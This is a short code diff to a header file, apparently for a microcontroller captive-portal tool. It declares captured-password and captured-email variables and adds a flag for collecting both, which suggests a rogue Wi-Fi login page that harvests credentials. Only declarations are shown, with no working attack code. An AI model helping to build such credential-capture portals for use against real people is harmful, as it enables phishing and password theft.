@@ -4,6 +4,7 @@
 extern bool portalRunning;
 extern bool isCaptured;
 extern String capturedPassword;
+extern String capturedEmail;
 
 #define MAX_CLIENTS 4
 #define WIFI_CHANNEL 6
@@ -11,6 +12,6 @@ extern String capturedPassword;
 
 void updateCaptivePortal();
 void stopCaptivePortal();
-void startCaptivePortal(String* ssid);
+void startCaptivePortal(String* ssid, bool email_and_pass);
 
 #endif
